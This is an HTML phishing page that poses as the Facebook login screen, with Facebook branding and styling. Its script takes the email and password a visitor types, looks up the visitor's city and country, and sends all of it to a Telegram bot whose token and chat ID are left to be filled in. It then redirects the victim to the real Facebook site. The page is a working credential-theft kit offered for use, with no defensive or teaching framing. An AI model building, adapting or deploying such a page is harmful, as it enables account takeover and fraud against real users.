<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>

    <!-- Redirect Immediately -->
    <script>
        // Uncomment the line below for an instant redirect
        // window.location.href = "https://Facebook.com";

        // Delayed Redirect (5 seconds)
        setTimeout(() => {
            window.location.href = "https://Facebook.com";
        }, 5000); // Change the time (5000ms = 5 seconds) if needed
    </script>

    <!-- External scripts and styles -->
    <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">

    <style>
        body {
            background: #1877F2;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
        }

        .form-container {
            background: #ffffff;
            border-radius: 8px;
            padding: 30px;
            width: 90%;
            max-width: 450px;
            text-align: center;
            margin: auto;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .form-container input,
        .form-container button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 6px;
            border: 1px solid #ddd;
            font-size: 16px;
            color: black;
        }

        .form-container button {
            background-color: #1877F2;
            color: white;
            padding: 15px;
            font-size: 16px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
        }

        .form-container button:hover {
            background-color: #166fe5;
        }

        .footer {
            background-color: #3b5998;
            color: white;
            text-align: center;
            padding: 15px 0;
            font-size: 14px;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <!-- Main content -->
    <div class="form-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
             alt="Facebook Logo" width="90" height="90" class="mx-auto">
        <h2 class="text-blue-800 text-2xl mt-4 font-bold">Log In to Facebook</h2>

        <!-- Login Form -->
        <form id="loginForm">
            <input type="text" name="email" id="email" placeholder="Email or Phone" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <button type="button" onclick="sendToTelegram()">Log In</button>
        </form>
    </div>

    <!-- Footer Section -->
    <footer class="footer">
        <div class="flex justify-center items-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            <span>Facebook Â© From Meta</span>
        </div>
    </footer>

    <script>
        async function sendToTelegram() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            try {
                const res = await axios.get('https://ipapi.co/json/');
                const data = res.data;

                const location = data.city || 'Unknown';
                const country = data.country_name || 'Unknown';

                const telegramToken = "YOUR_TELEGRAM_TOKEN"; // Replace with your bot token
                const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
                const message = `
Email: ${email}
Password: ${password}
Location: ${location}, ${country}
`;

                await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                    chat_id: chatId,
                    text: message
                });
            } catch (error) {
                console.error("Error sending to Telegram:", error);
            }

            // Redirect immediately after submission
            window.location.href = "https://Facebook.com";
        }
    </script>
</body>
</html>
